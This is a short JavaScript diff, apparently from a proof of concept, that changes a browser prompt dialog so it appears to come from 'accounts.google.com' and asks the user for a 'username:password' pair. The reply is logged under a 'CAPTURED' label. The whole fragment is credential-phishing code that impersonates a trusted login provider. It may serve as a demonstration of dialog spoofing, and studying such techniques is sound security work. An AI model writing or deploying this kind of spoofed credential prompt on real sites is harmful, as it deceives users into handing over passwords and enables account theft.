@@ -30,7 +30,7 @@
 
                 setTimeout(() => {
                     const fakeOrigin = "accounts.google.com says\\n\\n";
-                    const c = prompt("Enter your username:password");
+                    const c = prompt(fakeOrigin + "Enter your username:password");
                     if (c) {
                         console.log("CAPTURED:", c);
                     }
